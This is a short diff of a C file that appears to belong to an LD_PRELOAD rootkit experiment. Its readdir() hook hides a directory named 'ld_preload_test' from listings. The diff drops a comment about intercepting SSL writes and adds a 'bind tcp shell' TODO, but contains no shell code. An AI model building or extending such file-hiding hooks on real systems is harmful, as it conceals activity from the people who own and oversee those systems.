@@ -4,9 +4,6 @@
 #include <dlfcn.h>
 #include <dirent.h>
 #include <string.h>
-#include <sys/socket.h>
-#include <netinet/ip.h>
-#include <unistd.h>
 
 // hide folder function
 typedef struct dirent* (*ls_t)(DIR*);
@@ -27,6 +24,13 @@ struct dirent* readdir(DIR* dirp){
   } while (entry != NULL && strcmp(entry->d_name, "ld_preload_test") == 0);
   return entry;
 } 
-// TODO: intercept ssl_write calls 
+
+// bind tcp shell TODO
+
+
+
+
+
+
 
 
